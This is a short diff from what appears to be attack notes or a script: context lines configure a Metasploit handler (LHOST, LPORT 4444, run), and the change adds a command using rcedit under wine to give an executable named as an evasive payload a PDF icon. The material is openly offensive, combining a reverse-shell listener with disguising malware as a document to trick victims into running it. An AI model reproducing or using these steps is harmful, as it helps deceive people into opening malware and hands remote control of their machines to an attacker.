@@ -31,7 +31,4 @@ set LHOST 192.168.1.137
 set LPORT 4444
 run
 
-
-sudo apt install wine
-wget https://github.com/electron/rcedit/releases/download/v1.1.1/rcedit-x64.exe
-
+wine rcedit-x64.exe atibaia_payload_evasivo.exe --set-icon icone_pdf.ico
